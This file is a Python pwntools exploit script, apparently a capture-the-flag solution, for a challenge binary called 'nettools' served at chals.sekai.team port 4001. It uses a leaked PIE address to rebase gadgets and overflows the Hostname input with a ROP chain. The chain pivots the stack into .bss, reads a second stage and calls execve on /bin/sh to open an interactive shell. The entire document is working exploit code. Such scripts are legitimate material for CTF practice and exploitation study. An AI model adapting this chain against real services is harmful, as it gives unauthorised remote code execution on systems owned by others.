#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import sys

from pwn import *

elf = context.binary = ELF("./nettools", checksec=False)
# context.log_level = "CRITICAL"


def start(argv=[], *a, **kw):
    nc = "nc chals.sekai.team 4001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {"RUST_BACKTRACE": "full"}
io = start()

io.recvuntil(b"is leaked: 0x")
pie_leak = int(io.recvline(keepends=False), 16)
elf.address = pie_leak - 0x7a03c
log.info(f"{elf.address=:#x}")


def rebase(offset):
    return elf.address + offset


nettools_read = rebase(0xc5c0)

mov_rdx_rsi = rebase(0x0005f2cd)
pop_rdi = rebase(0x0005f373)
pop_rsi_r15 = rebase(0x0005f371)
pop_rsp_r14_r15 = rebase(0x0005b7e0)
syscall = rebase(0x00025adf)
pop_rax = rebase(0x000540b3)

new_stack = elf.bss(0x600)

payload = b"localhost"
payload = payload.ljust(0x2e8, b"\x00")
payload += flat(
    pop_rdi, new_stack,
    pop_rsi_r15, 0x800, 0,
    mov_rdx_rsi,
)
payload += p64(nettools_read)
payload += flat(
    pop_rsp_r14_r15,
    new_stack + 0x100,
)
log.info(f"{new_stack=:#x}")
# pause()
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Hostname: ", payload)
# pause(1)

payload = b"/bin/sh\x00"
payload = payload.ljust(0x100, b"\x00")
payload += flat(
    0, 0,
    pop_rdi, new_stack,
    pop_rsi_r15, 0, 0,
    mov_rdx_rsi,
    pop_rax, 0x3b,
    syscall,
)

pause(1)
io.sendline(payload)

io.interactive()
